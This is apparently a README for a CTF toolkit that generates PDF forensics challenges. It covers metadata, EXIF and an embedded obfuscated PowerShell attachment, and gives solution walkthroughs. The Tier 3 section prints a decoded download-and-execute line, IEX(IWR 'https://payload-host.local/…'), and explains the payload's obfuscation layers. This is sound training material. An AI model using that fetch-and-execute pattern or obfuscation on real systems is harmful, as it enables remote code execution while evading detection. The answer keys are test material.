# PDF Challenges

This directory contains scripts that generate PDF-based CTF challenges. Each script builds a viewable PDF artifact with a flag hidden using a specific technique. Participants analyze the artifact using standard tools.

## Tiers Available

| Tier | Script | Technique | Status |
|------|--------|-----------|--------|
| 1 | `build_pdf_meta.py` | Flag in PDF metadata (Subject field) | ✅ Working |
| 1.5 | `build_pdf_image_exif.py` | Flag in EXIF UserComment of embedded image | ✅ Working |
| 3 | `build_pdf_embedded_ps.py` | Obfuscated PowerShell payload embedded as PDF attachment | ✅ Working |

Difficulty increases with tier number. Tier 2 (hidden stream) and Tier 4 (generic embedded file) are planned but not yet built.

---

## Deployment (For CTF Hosts)

### Prerequisites

- Python 3.8 or newer
- Required packages:
```bash
  pip3 install reportlab==3.6.12 PyPDF2 Pillow piexif pikepdf oletools
```

### Build the artifacts

From this directory on the host's build machine:

```bash
# Tier 1 — flag is hardcoded in the script; edit the bottom to change
python3 build_pdf_meta.py
# Produces: quarterly_report.pdf

# Tier 1.5
python3 build_pdf_image_exif.py --flag "CTF{your_flag_here}"
# Produces: incident_report.pdf

# Tier 3
python3 build_pdf_embedded_ps.py --flag "CTF{your_flag_here}"
# Produces: cyber_awareness.pdf
```

### Per-team / per-event flags

Scripts that accept `--flag` can be invoked once per team to generate unique artifacts:

```bash
python3 build_pdf_embedded_ps.py --flag "CTF{team_alpha_unique}" --output team_alpha.pdf
python3 build_pdf_embedded_ps.py --flag "CTF{team_bravo_unique}" --output team_bravo.pdf
```

This is the recommended anti-cheat / anti-AI strategy: every team gets a different flag, so sharing solutions doesn't work.

### Distribute the artifacts

Built PDFs are **not committed to this repo** (see `.gitignore`). Distribute via your event's normal channels: zip file, Docker container with read-only mounts, CTFd attachment, etc.

### Verify before distribution

Each script prints suggested verification commands at the end. Run them to confirm the flag is recoverable via the intended path and not via lazy methods like `cat | grep CTF`.

---

## Solving (For Organizers — Solution Reference)

> Do not share with active participants.

### Tier 1: `quarterly_report.pdf`

The flag is stored plaintext in the PDF's `Subject` metadata field.

**Intended path:**
```bash
exiftool quarterly_report.pdf
```
The `Subject` line reveals the flag.

**Alternative paths that also work** (this is the beginner tier):
```bash
strings quarterly_report.pdf | grep CTF
cat quarterly_report.pdf | grep CTF
```

`pdfid.py` reports nothing suspicious — no JavaScript, no embedded files. The lesson: not all malicious content is loud. Metadata is a place data can hide.

---

### Tier 1.5: `incident_report.pdf`

The PDF embeds a JPEG image. The flag is in the image's EXIF `UserComment` field. Decoy URLs and fake IOCs are scattered throughout the PDF body and metadata as red herrings.

**Intended path:**
```bash
# 1. Confirm image objects exist
python3 ~/tools/pdfid.py incident_report.pdf

# 2. Extract embedded images
pdfimages -all incident_report.pdf extracted

# 3. Read the image's EXIF
exiftool extracted-000.jpg
```
The `User Comment` field reveals the flag.

**What does NOT work:**
- `strings incident_report.pdf | grep CTF` — flag is inside binary JPEG/EXIF data
- `exiftool incident_report.pdf` alone — that reads PDF metadata, not the embedded image's metadata
- `strings | grep http` — only finds decoy URLs

**Alternative path (more advanced):**
```bash
python3 ~/tools/pdf-parser.py incident_report.pdf
python3 ~/tools/pdf-parser.py -o N -d image.jpg incident_report.pdf
exiftool image.jpg
```

---

### Tier 3: `cyber_awareness.pdf`

The PDF looks like a routine cybersecurity awareness fact sheet, with 10 decoy URLs scattered through body text. Embedded inside as a file attachment is `daily_audit.ps1` — an obfuscated PowerShell script. When deobfuscated, it executes an `Invoke-Expression` against a URL — and the URL path contains the flag.

**Intended path:**

```bash
# 1. PDF triage — note the /EmbeddedFile count
python3 ~/tools/pdfid.py cyber_awareness.pdf
# /EmbeddedFile        1   <-- suspicious!

# 2. Locate the attachment object
python3 ~/tools/pdf-parser.py --search EmbeddedFile cyber_awareness.pdf
# Look for the object number with Type: /EmbeddedFile (e.g. "obj 5 0")

# 3. Extract the payload
python3 ~/tools/pdf-parser.py -o 5 -d extracted.ps1 cyber_awareness.pdf

# 4. Inspect the PowerShell
cat extracted.ps1
```

The extracted `.ps1` contains two large base64-looking strings concatenated, then reversed, then base64-decoded as UTF-16LE, then executed via `Invoke-Expression`.

**Deobfuscate it WITHOUT running it:**

```python
import base64
import re

with open("extracted.ps1") as f:
    content = f.read()

# Pull the two string parts out
parts = re.findall(r'"([A-Za-z0-9+/=]+)"', content)
combined = parts[0] + parts[1]

# Reverse
reversed_str = combined[::-1]

# Base64 decode as UTF-16LE (PowerShell's encoding for -EncodedCommand)
decoded = base64.b64decode(reversed_str).decode("utf-16-le")

print(decoded)
# Output: IEX(IWR 'https://payload-host.local/get/CTF{...}').Content
```

The flag is in the URL path of the `Invoke-WebRequest`.

**Alternative tools for the deobfuscation step:**
- [CyberChef](https://gchq.github.io/CyberChef/) — recipe: Reverse → From Base64 → Decode text (UTF-16LE)
- A throwaway Python REPL
- Manual: paste the combined string into any base64 decoder after reversing

**What does NOT work:**
- `strings cyber_awareness.pdf | grep -i ctf` — flag is in a compressed/encoded stream
- Running the PowerShell directly — `payload-host.local` doesn't resolve; also, **don't run untrusted code**
- Reading the `.ps1` content as-is — it's obfuscated three layers deep

---

## Skills Taught

### Tier 1
- File metadata is a place data can hide
- `exiftool` for reading metadata from any file type
- `pdfid.py` for high-level PDF triage (and recognizing when it reports "clean" but data is still present)
- The instinct to inspect a file *before* opening it

### Tier 1.5
- Files can contain files — PDFs embed images, images have their own metadata
- `pdfimages` for extracting embedded images from PDFs
- `pdf-parser.py` for navigating PDF object structure manually
- EXIF analysis (a common hiding spot for IOCs in real-world malware)
- Recognizing decoy data — not every URL or hash you find is meaningful
- Multi-tool, multi-step analysis workflows
- Why a single tool's output is never the complete picture

### Tier 3
- Recognizing `/EmbeddedFile` as a high-signal indicator in PDF triage
- Extracting embedded files using `pdf-parser.py -o N -d output_file`
- Recognizing obfuscated PowerShell patterns:
  - Base64 strings (especially long, no special characters)
  - String reversal via `-join ($x[-1..-($x.Length)])`
  - Variable concatenation to hide literal strings
  - `Invoke-Expression` (`IEX`) as the eventual executor
  - PowerShell's UTF-16LE encoding convention
- Static analysis discipline: deobfuscating without executing
- Using CyberChef or scripting for multi-step decoding
- Why `Invoke-WebRequest` + `Invoke-Expression` is a classic malware pattern
- Recognizing that obvious-looking URLs in payload code may themselves carry the prize

---

## Tools Required for Analysis

Participants should have these available in their analysis environment:

- `exiftool` — Homebrew: `brew install exiftool`
- `pdfimages` (part of `poppler`) — `brew install poppler`
- `pdfid.py` and `pdf-parser.py` from Didier Stevens — https://didierstevens.com/programs.html
- `strings` — built into macOS and Linux
- A text editor / hex viewer for cross-referencing
- Python 3 (for ad-hoc deobfuscation) or CyberChef in a browser

---

## Notes for Hosts Forking This Repo

- All scripts produce viewable, normal-looking PDFs — they open in any reader without errors or warnings
- Decoy content (URLs, IOCs, log lines, fact-sheet body text) can be edited at the top of each script to match your event's theme
- For higher difficulty, layer additional encoding (base64 the flag before EXIF embedding, swap metadata fields, add more obfuscation layers in the PowerShell)
- Generated PDFs are in `.gitignore` — never commit built artifacts to a public repo, even with placeholder flags
- The scripts reveal the technique to anyone who reads them; that's by design (this repo is a host toolkit, not a participant-facing resource). For events with the same participant pool repeatedly seeing this repo, customize the scripts substantially or use different cover stories per event.
